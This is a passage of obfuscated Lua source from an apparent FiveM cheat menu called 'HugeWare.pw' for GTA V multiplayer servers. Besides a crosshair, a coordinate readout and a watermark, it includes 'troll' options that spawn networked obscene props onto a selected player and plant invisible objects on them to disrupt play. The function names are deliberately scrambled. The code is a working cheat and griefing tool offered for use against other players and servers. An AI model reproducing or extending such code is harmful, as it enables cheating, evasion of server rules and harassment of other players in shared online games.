                elseif aiming_idhgsiduhgidf then
                    if
                        Czitirzen_InvokeNative(0x524AC5ECEA15343E, fkioergreopgiproeguioepr) and
                            not Czitirzen_InvokeNative(0x3317DEDB88C95038, fkioergreopgiproeguioepr, 0) and
                            Czitirzen_InvokeNative(0x12534C348C6CB68B, fkioergreopgiproeguioepr)
                     then
                        narysuj_celownik_xd_uhfaidsoulgdfsdfg("~r~.", 0.4968, 0.478)
                    else
                        narysuj_celownik_xd_uhfaidsoulgdfsdfg(".", 0.4968, 0.478)
                    end
                end
            end

            if HugeV.locals.CrosshairBetter then
                DrawRect(0.5, 0.5, 0.006, 0.004, 0, 0, 0, 255)

                DrawRect(0.5, 0.5, 0.002, 0.011, 0, 0, 0, 255)

                DrawRect(0.5, 0.5, 0.0045, 0.001, 255, 255, 255, 255)

                DrawRect(0.5, 0.5, 0.001, 0.008, 255, 255, 255, 255)
            end

            if HugeV.locals.ShowCoords then
                local coords = GetEntityCoords(HugeV.Player.PedId)

                local heading = GetEntityHeading(HugeV.Player.PedId)

                text_szpachlan_szmata(
                    ("~m~X: ~s~%s ~m~Y: ~s~%s ~m~Z: ~s~%s ~m~H: ~s~%s"):format(
                        string.format("%.2f", coords.x),
                        string.format("%.2f", coords.y),
                        string.format("%.2f", coords.z),
                        string.format("%.2f", heading)
                    ),
                    0.0,
                    true,
                    nil,
                    0.35,
                    0.5,
                    true,
                    0.1
                )
            end

            if HugeV.locals.watermark and not HugeV.locals.Displayed then
                DrawRect(0.087, 0.05, 0.13, 0.027, 31, 30, 33, 255)
                DrawRect(0.087, 0.033, 0.13, 0.005, 160, 155, 195, 255)

                local nazwa = GetPlayerName(PlayerId())
                if string.len(nazwa) > 26 then
                    local ile = string.len(nazwa) - 26
                    nazwa = string.sub(nazwa, 1, 26 - ile) .. "..."
                end

                local year, month, day, hour, minute, second = GetUtcTime()
                text_szpachlan_szmata(
                    "HugeWare.pw | " .. nazwa .. " | " .. string.format("%02d:%02d:%02d", hour, minute, second),
                    false,
                    0.19,
                    1,
                    0.023,
                    0.04
                )
            end

            ----------------- TROLL OPTIONS ON CHECKBOX -----------------

            if DildoRain then
                local dildo_coords = GetEntityCoords(GetPlayerPed(HugeV.locals.SelectedPlayer))
                local object =
                    CreateObject(
                    GetHashKey("prop_cs_dildo_01"),
                    dildo_coords.x,
                    dildo_coords.y,
                    dildo_coords.z + 0.5,
                    true,
                    true,
                    true
                )
                FreezeEntityPosition(object, false)
            end

            if HugeV.locals.BugPlayer then
                local dildo_coords = GetEntityCoords(GetPlayerPed(HugeV.locals.SelectedPlayer))
                local object =
                    CreateObject(
                    GetHashKey("prop_cs_dildo_01"),
                    dildo_coords.x,
                    dildo_coords.y,
                    dildo_coords.z + 0.5,
                    true,
                    true,
                    true
                )
                SetEntityVisible(object, false, false)
            end
        end
    end
)

Citizen.CreateThread(
    function()
        while HugeV.locals.MenuEnabled do
            Citizen.Wait(0)

            if IsControlJustPressed(1, OpenMenuKey["Value"]) then
                if HugeV.locals.Displayed then
                    HugeV.locals.Displayed = false
                else
                    HugeV.locals.Displayed = true
                end
                HugeV.locals.Menu_Display = not HugeV.locals.Menu_Display
            end
            if HugeV.locals.Menu_Display then
                kontrols_asd()
                meni_gwegreh()
            end
        end
    end
)

--bäärs#3150